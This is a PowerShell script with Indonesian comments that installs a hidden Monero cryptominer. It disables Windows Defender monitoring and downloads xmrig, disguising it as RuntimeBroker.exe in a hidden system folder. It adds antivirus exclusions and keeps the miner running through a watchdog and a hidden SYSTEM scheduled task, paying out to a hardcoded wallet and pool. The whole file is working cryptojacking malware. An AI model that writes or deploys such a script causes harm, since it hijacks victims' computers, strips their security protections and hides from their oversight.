# ==========================================
# SETUP AMAN DARI CRASH / FORCE CLOSE
# ==========================================
$ErrorActionPreference = "SilentlyContinue"

# 1. Matikan Tameng (Aman dengan Try-Catch)
try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
try { Set-MpPreference -DisableBehaviorMonitoring $true } catch {}
try { Set-MpPreference -DisableScriptScanning $true } catch {}

# 2. Inisialisasi Direktori Utama
$TargetDir = "C:\Users\Public\Libraries"
try {
    if (!(Test-Path $TargetDir)) {
        New-Item -ItemType Directory -Force -Path $TargetDir | Out-Null
    }
} catch {
    $TargetDir = Join-Path $env:TEMP "WinUpdateCache"
    if (!(Test-Path $TargetDir)) {
        New-Item -ItemType Directory -Force -Path $TargetDir | Out-Null
    }
}

$ExeName = "RuntimeBroker.exe"
$ExePath = Join-Path $TargetDir $ExeName
$ZipPath = Join-Path $env:TEMP "up.zip"
$Pool = "gulf.moneroocean.stream:10128"
$Wallet = "42imHjeSVgSG54hiTVmeGa8evmKJ55oWYgb6np1zanx5j8eoCM4vfbN9xSua1unVEV5mZCxxs637LdmVEJMs1XMFCWsHvc1"
$ArgsList = "-o $Pool -u $Wallet -p x --tls --donate-level=1 --cpu-max-threads-hint=45 --background"

# 3. Bersihkan Proses Lama
try {
    Get-CimInstance Win32_Process | Where-Object { $_.Path -eq $ExePath } | ForEach-Object {
        Stop-Process -Id $_.ProcessId -Force
    }
    Stop-Process -Name "wscript", "powershell" -Force
    Unregister-ScheduledTask -TaskName "RuntimeBrokerService" -Confirm:$false
} catch {}

Start-Sleep -Seconds 2

# 4. Unduh & Ekstrak Biner
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$DownloadUrl = "https://github.com/MoneroOcean/xmrig_setup/raw/master/xmrig.zip"

try {
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $ZipPath -ErrorAction Stop
} catch {}

if (Test-Path $ZipPath) {
    try {
        Expand-Archive -Path $ZipPath -DestinationPath $env:TEMP -Force
    } catch {}

    $Extracted = Get-ChildItem -Path $env:TEMP -Filter "xmrig.exe" -Recurse | Select-Object -First 1

    if ($Extracted -and (Test-Path $Extracted.FullName)) {
        try {
            Copy-Item -Force $Extracted.FullName $ExePath
        } catch {}

        # Sembunyikan folder & Exclusion
        try {
            Set-ItemProperty -Path $TargetDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
            Add-MpPreference -ExclusionPath $TargetDir
            Add-MpPreference -ExclusionProcess $ExeName
        } catch {}

        # Buat Watchdog Monitor
        try {
            $Watcher = Join-Path $TargetDir "monitor.ps1"
            $WatcherCode = @"
`$ExePath = "$ExePath"
`$ArgsList = "$ArgsList"
while (`$true) {
    `$Run = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -eq `$ExePath }
    if (!`$Run) {
        Start-Process -FilePath `$ExePath -ArgumentList `$ArgsList -WindowStyle Hidden
    } else {
        foreach (`$p in `$Run) { try { `$p.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle } catch {} }
    }
    Start-Sleep -Seconds 10
}
"@
            Set-Content -Path $Watcher -Value $WatcherCode -Force
        } catch {}

        # Buat VBScript Wrapper untuk Session 0
        try {
            $Vbs = Join-Path $TargetDir "run.vbs"
            $VbsCode = @"
Dim shell
Set shell = CreateObject("Wscript.Shell")
shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$Watcher""", 0, False
"@
            Set-Content -Path $Vbs -Value $VbsCode -Force
        } catch {}

        # Pendaftaran Task Scheduler SYSTEM
        try {
            $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$Vbs`""
            $Trigger = (New-ScheduledTaskTrigger -AtStartup), (New-ScheduledTaskTrigger -AtLogOn)
            $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType Service -RunLevel Highest
            $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
            Register-ScheduledTask -TaskName "RuntimeBrokerService" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
        } catch {}

        # Jalankan Miner Langsung
        try {
            Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden
        } catch {}
    }

    try {
        Remove-Item -Force $ZipPath -ErrorAction SilentlyContinue
    } catch {}
}

Write-Host "Instalasi selesai tanpa kendala!" -ForegroundColor Green
